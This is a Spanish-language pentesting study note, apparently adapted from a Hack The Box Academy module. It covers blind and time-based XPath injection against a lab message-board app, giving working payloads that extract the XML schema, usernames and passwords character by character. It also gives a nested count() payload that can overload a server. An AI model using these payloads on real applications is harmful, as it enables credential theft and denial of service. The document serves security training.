---
tags:
  - Datos
  - Pentesting/Vulnerabilidad
  - Web/Red-Team
Fecha de actualización: 2025-10-23
Nota previa: "[[Exfiltración avanzada de datos]]"
Nota siguiente:
Area: "[[Inyección XPath]]"
---
---

# Metodología
Primero discutiremos cómo exfiltrar el esquema *XML*, lo que nos permitirá inyectar [[Inyección XPath|consultas XPath]] para apuntar a los datos interesantes. Esto nos permite exfiltrar el nombre de los nodos de elementos para construir consultas XPath sin comodines para limitar nuestras consultas a puntos de datos interesantes. Para ello, podemos utilizar el `name()`, `substring()`, `string-length()`, y `count()` funciones. El `name()` La función se puede llamar en cualquier nodo y nos da el nombre de ese nodo. El `substring()` La función nos permite exfiltrar el nombre de un nodo un carácter a la vez. El `string-length()` La función nos permite determinar la longitud del nombre de un nodo para saber cuándo detener la exfiltración. Por último, el `count()` La función devuelve el número de hijos de un nodo de elemento.

Discutiremos la metodología para la exfiltración ciega de datos basada en nuestra aplicación web de muestra con una inyección XPath en un predicado de la consulta XPath.

**Nota:** Si el punto de inyección XPath no está dentro de un predicado, podemos aplicar la misma metodología que se analiza a continuación agregando nuestro propio predicado.

---

# Explotación
Al iniciar la aplicación web a continuación, podemos ver una aplicación web de tablero de mensajes que nos permite enviar mensajes a los usuarios de la plataforma de forma anónima proporcionándoles su nombre de usuario:
![Tablero de mensajes basado en XML con campos para nombre de usuario y mensaje, botón de envío.](https://academy.hackthebox.com/storage/modules/204/blind_1.png)

Independientemente de si proporcionamos un nombre de usuario válido o no, la aplicación web reacciona de manera diferente. Si proporcionamos un nombre de usuario válido, nos indica que el mensaje se envió correctamente:
![Solicitud HTTP POST con nombre de usuario 'admin' y mensaje 'HelloWorld!', formulario de respuesta con alerta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_2.png)

Sin embargo, si el nombre de usuario no era válido, obtenemos una respuesta diferente:
![Solicitud HTTP POST con nombre de usuario 'inválido' y mensaje '¡Hola Mundo!', formulario de respuesta con alerta '¡El usuario no existe!'.](https://academy.hackthebox.com/storage/modules/204/blind_3.png)

## Confirmación de la inyección XPath
Antes de iniciar la explotación a ciegas, debemos determinar si la aplicación web es vulnerable a la inyección XPath. Dado que se verifica la validez del nombre de usuario que proporcionamos, podemos asumir que se utiliza en una consulta XPath similar a la siguiente:
```xpath
/users/user[username='admin']
```

De esta forma, nuestro nombre de usuario proporcionado se inserta en un predicado. Podemos confirmar esta sospecha proporcionando el nombre de usuario `invalid' or '1'='1`. Esto da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or '1'='1']
```

El nombre de usuario que proporcionamos no es válido, sin embargo, la consulta aún debería devolver datos debido a nuestra inyección `or` cláusula, que da como resultado un predicado universalmente verdadero. De esta forma, la aplicación web responde como si le hubiéramos proporcionado un nombre de usuario válido:
![Solicitud HTTP POST con intento de inyección SQL en nombre de usuario, mensaje '¡Hola Mundo!', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_4.png)

Por lo tanto, confirmamos que la aplicación web es vulnerable a la inyección ciega de XPath.

## Exfiltrar la longitud del nombre de un nodo
Para exfiltrar la longitud del nombre del nodo raíz, podemos usar la carga útil `invalid' or string-length(name(/*[1]))=1 and '1'='1`, lo que da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
```

La consulta `/*[1]` selecciona el nodo del elemento raíz. Desde el nombre de usuario `invalid` no existe y `'1'='1'` es universalmente cierto, esta consulta devuelve datos sólo si `string-length(name(/*[1]))=1` es verdadero, lo que significa que la longitud del nombre del nodo del elemento raíz es `1`. En nuestro caso, la consulta no devuelve ningún dato:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡El usuario no existe!'.](https://academy.hackthebox.com/storage/modules/204/blind_5.png)

Por lo tanto, nuestra longitud estimada de `1` estaba incorrecto. Ahora necesitamos incrementar la longitud hasta encontrar el valor correcto, que en nuestro caso es `5`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_6.png)

De esta forma, determinamos con éxito la longitud del nombre del nodo raíz `5`.

**Nota:** Podemos utilizar otros operadores como `<,<=,>`, y `>=` para acelerar la búsqueda.

## Exfiltrar el nombre de un nodo
Ahora que conocemos la longitud del nombre del nodo, podemos exfiltrar el nombre carácter por carácter. Para ello, podemos utilizar la carga útil `invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`, lo que da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']
```

La consulta anterior devuelve datos solo si el primer carácter del nombre del nodo raíz es igual `a`, lo cual no es el caso:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡El usuario no existe!'.](https://academy.hackthebox.com/storage/modules/204/blind_7.png)

Necesitamos iterar a través de todos los caracteres posibles hasta encontrar el correcto, que en nuestro caso es `u`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_8.png)

Exfiltramos con éxito el primer carácter del nombre del nodo raíz. Ahora podemos pasar al segundo personaje con la carga útil `invalid' or substring(name(/*[1]),2,1)='a' and '1'='1` donde nuevamente tenemos que verificar todos los personajes posibles hasta que encontremos una coincidencia. Si repetimos esto hasta alcanzar la longitud que determinamos en el paso anterior, podemos exfiltrar el nombre completo del nodo raíz como `users`.

## Exfiltración del número de nodos secundarios
Para determinar la cantidad de nodos secundarios para un nodo determinado, podemos utilizar el `count()` función en una carga útil como esta: `invalid' or count(/users/*)=1 and '1'='1`, lo que da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or count(/users/*)=1 and '1'='1']
```

Esta consulta devuelve datos si encontramos con éxito el número de nodos secundarios del `users` nodo, que en nuestro caso es `2`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_11.png)

Ahora podemos volver al paso anterior y apuntar al `users` el primer hijo del nodo al abordarlo con `/users/*[1]`. Comenzando con la longitud del nombre del nodo y luego el nombre en sí. Debemos repetir este paso hasta alcanzar la profundidad máxima. Además, podemos dirigirnos a los hermanos aumentando la posición. Por ejemplo, podemos apuntar a la `users` segundo hijo del nodo al direccionarlo con `/users/*[2]`.

De esta manera, podemos exfiltrar iterativamente todo el esquema XML. En nuestro caso, al hacerlo se revela el siguiente esquema:
```xml
<users>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
</users>
```

## Exfiltración de datos
Ahora que conocemos el esquema XML, podemos inyectar una carga útil específica para exfiltrar los datos que queremos adquirir. Podemos reutilizar la misma metodología que antes. Comencemos con el nombre de usuario. Primero, necesitamos determinar la longitud del nombre de usuario. Para ello, podemos utilizar una carga útil como esta: `invalid' or string-length(/users/user[1]/username)=1 and '1'='1`, lo que da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']
```

En nuestro caso, podemos determinar la longitud del nombre de usuario `5`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_10.png)

Ahora podemos pasar a exfiltrar el nombre de usuario. Considere una carga útil como esta: `invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`, lo que da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']
```

La consulta anterior devuelve datos solo si el primer carácter del nombre de usuario del primer usuario es igual a `a`, que es el caso:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje 'HelloWorld', alerta de respuesta '¡Mensaje enviado exitosamente!'.](https://academy.hackthebox.com/storage/modules/204/blind_9.png)

Nuevamente, podemos iterar a través de todos los caracteres hasta que exfiltremos con éxito todo el nombre de usuario `admin`. A partir de nuestra exfiltración de esquemas, ya sabemos que hay dos usuarios en total, por lo que podemos aplicar esta metodología a todos los usuarios y sus propiedades para exfiltrar todo el conjunto de datos.

**Nota:** Se recomienda escribir un pequeño guión para esta tarea.

---

# Explotación basada en el tiempo
XPath no contiene un `sleep` función, por lo que una explotación similar a la inyección SQL ciega es imposible en vulnerabilidades de inyección XPath. Sin embargo, podemos abusar del tiempo de procesamiento de la aplicación web para crear un comportamiento similar a un `sleep` función. Necesitamos esto en los casos en que la aplicación web ofrece la misma respuesta, ya sea que la consulta XPath haya devuelto datos o no, y donde no tenemos información suficiente para provocar un resultado positivo de la consulta. Un ejemplo en el caso discutido anteriormente sería si no podemos adivinar un nombre de usuario válido. Para este ejemplo, nos centraremos en una aplicación web que devuelve una respuesta genérica independientemente de si proporcionamos un usuario válido o no:
![Solicitud HTTP POST con nombre de usuario 'admin' y mensaje 'HelloWorld!', alerta de respuesta 'Si el usuario existe, ¡el mensaje ha sido enviado!'.](https://academy.hackthebox.com/storage/modules/204/xpath_timebased_1.png)

En este caso, no podemos aplicar la metodología discutida anteriormente. Sin embargo, podemos obligar a la aplicación web a iterar exponencialmente sobre todo el documento XML, lo que requiere una cantidad mensurable de tiempo de procesamiento. Esto se puede lograr llamando recursivamente al `count` función con predicados apilados para obligar a la aplicación web a iterar exponencialmente sobre todos los nodos del documento XML. Considere la siguiente carga útil en el `username` parámetro:
```xpath
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

Esto da como resultado la siguiente consulta XPath:
```xpath
/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1']
```

Si la condición `substring(/users/user[1]/username,1,1)='a'` es `true`, la segunda parte de la `and` es necesario evaluar la cláusula, de modo que la aplicación web evalúe `count((//.)[count((//.))])` provocando que itere exponencialmente sobre todo el documento XML, lo que resulta en un tiempo de procesamiento significativo. Por otro lado, si la condición inicial es `false`, la segunda parte de la `and` No es necesario evaluar la cláusula ya que el predicado regresará `false` No importa lo que evalúe la segunda parte. Por tanto, la aplicación web no lo evalúa. Esta diferencia en el tiempo de procesamiento nos permite determinar si nuestra condición inyectada es verdadera.

En nuestra aplicación web de ejemplo, sabemos que el primer carácter del primer nombre de usuario es `a`, ya que esto provoca un tiempo de procesamiento de `477ms`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje '¡Hola mundo!', estado de respuesta 200 OK.](https://academy.hackthebox.com/storage/modules/204/xpath_timebased_2.png)

Un carácter diferente da como resultado un tiempo de procesamiento de `1ms`:
![Solicitud HTTP POST con intento de inyección XPath en nombre de usuario, mensaje '¡Hola mundo!', estado de respuesta 200 OK.](https://academy.hackthebox.com/storage/modules/204/xpath_timebased_3.png)

Podemos combinar este exploit basado en el tiempo con la metodología descrita anteriormente para exfiltrar el esquema XML seguido de los datos XML.

Recuerde que el tiempo de procesamiento depende del tamaño del documento XML. Si el documento XML es pequeño, es posible que necesitemos apilar predicados adicionales con llamadas al `count` función para lograr una diferencia mensurable en el tiempo de procesamiento. Sin embargo, si el documento XML es grande, esta carga útil puede causar rápidamente una carga significativa en el servidor web, lo que podría resultar en `Denial-of-Service (DoS)`. Por tanto, es fundamental tener cuidado con este tipo de carga útil.